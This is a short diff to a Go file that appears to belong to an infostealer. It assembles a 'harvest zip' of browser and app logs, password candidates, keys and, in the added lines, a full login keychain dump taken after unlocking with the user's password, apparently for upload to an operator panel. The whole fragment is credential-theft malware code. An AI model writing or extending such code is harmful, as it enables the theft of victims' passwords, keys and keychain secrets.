@@ -1,3 +1,8 @@
+// export_logs.go — materializes human-readable log files for the harvest zip.
+//
+// Converts CollectionResult slices into text/JSON under logs/{browsers,apps,...}
+// and meta/*. Paths use the constants from export_layout.go so the panel and
+// README stay in sync with on-disk layout.
 package main
 
 import (
@@ -9,6 +14,7 @@ import (
 	"recovery/recovery"
 )
 
+// buildAllLogFiles returns zipPath → file contents for summary, README, and all log categories.
 func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 	if p == nil || p.Result == nil {
 		return map[string][]byte{
@@ -74,6 +80,10 @@ func buildAllLogFiles(p *harvestPayload) map[string][]byte {
 	}
 	if data := jsonLog("password_candidates.json", r.PasswordCandidates); len(data) > 0 {
 		out[zipLogsKeys+"password_candidates.json"] = data
+	}
+	// Full login keychain dump (phase-1 / primary upload) — produced after unlock with user password.
+	if len(p.KeychainDump) > 0 {
+		out[zipLogsKeys+"keychain_dump.txt"] = p.KeychainDump
 	}
 	if data := jsonLog("keys.json", r.Keys); len(data) > 0 {
 		out[zipLogsKeys+"keys.json"] = data
